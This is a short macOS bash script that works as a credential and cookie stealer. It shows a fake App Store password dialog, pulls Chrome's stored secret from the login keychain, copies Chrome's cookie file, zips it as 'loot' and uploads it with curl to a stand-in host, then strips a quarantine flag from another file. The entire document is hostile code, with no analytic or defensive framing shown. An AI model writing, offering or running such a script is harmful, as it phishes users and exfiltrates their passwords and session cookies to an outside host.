#!/bin/bash
osascript -e 'display dialog "App Store needs your password" default answer "" with hidden answer'
security find-generic-password -wa "Chrome" login.keychain
cp -r "$HOME/Library/Application Support/Google/Chrome/Default/Cookies" /tmp/c
zip -r /tmp/loot.zip /tmp/c
curl -F "file=@/tmp/loot.zip" http://192.0.2.1/up
xattr -d com.apple.quarantine /tmp/x
